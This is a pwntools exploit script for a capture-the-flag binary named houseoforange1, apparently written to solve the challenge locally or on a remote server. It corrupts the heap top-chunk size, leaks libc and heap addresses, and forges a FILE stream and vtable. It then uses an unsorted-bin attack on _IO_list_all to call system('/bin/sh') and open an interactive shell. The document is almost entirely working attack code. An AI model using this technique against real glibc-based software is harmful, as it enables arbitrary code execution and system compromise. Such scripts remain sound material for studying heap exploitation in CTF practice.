#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './houseoforange1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('oice : ')

def create(size, name, price, col):
    eat()
    p.sendline('1')
    p.recvuntil('f name :')
    p.sendline(str(size))
    p.recvuntil('Name :')
    p.sendline(name)
    p.recvuntil('ice of Orange:')
    p.sendline(str(price))
    p.recvuntil('lor of Orange:')
    p.sendline(str(col))

def show():
    eat()
    p.sendline('2')

def edit(size, name, price, col):
    eat()
    p.sendline('3')
    p.recvuntil('f name :')
    p.sendline(str(size))
    p.recvuntil('Name:')
    p.sendline(name)
    p.recvuntil('ice of Orange:')
    p.sendline(str(price))
    p.recvuntil('lor of Orange:')
    p.sendline(str(col))

create(0x80,"ddaa",199,2)
payload = b"a"*0x90
payload += p32(0xdada) + p32(0x20) + p64(0)
payload += p64(0) + p64(0xf31) # forge top size

edit(0xb1,payload,123,3) # overwrite the size of top
create(0x1000,"qqqqq",199,1) # trigger the _int_free in sysmalloc
create(0x400,"aaaaaaa",199,2) # create a large chunk and Leak the address of libc

show()

p.recvuntil("a"*0x7)
p.recvuntil('\n')
libc.address = u64(p.recv(6).ljust(8, b"\x00"))-0x3c4188
log.success("libc.address: "+hex(libc.address))
edit(0x400,"c"*16,245,1) # Leak the address of heap

show()
p.recvuntil("c"*16)
heap_base = u64(p.recv(6).ljust(8, b"\x00"))-0xa-0x100
log.success("heap_base: "+hex(heap_base))

io_list_all = libc.symbols['_IO_list_all']
log.success("io_list_all: "+hex(io_list_all))
system = libc.symbols['system']
log.success("system: "+hex(system))
vtable_addr = heap_base + 0x728-0xd0
log.success("vtable_addr: "+hex(vtable_addr))

payload = b"b"*0x410
payload += p32(0xdada) + p32(0x20) + p64(0)
stream = b"/bin/sh\x00" + p64(0x61) # fake file stream
stream += p64(0xddaa) + p64(io_list_all-0x10) # Unsortbin attack
stream = stream.ljust(0xa0,b"\x00")
stream += p64(heap_base+0x700-0xd0)
stream = stream.ljust(0xc0,b"\x00")
stream += p64(1)
payload += stream
payload += p64(0)
payload += p64(0)
payload += p64(vtable_addr)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(0)*3 # vtable
payload += p64(system)
edit(0x800,payload,123,3)

p.recvuntil(":")
p.sendline("1") # trigger malloc and abort
log.success("libc.address: "+hex(libc.address))
p.interactive()
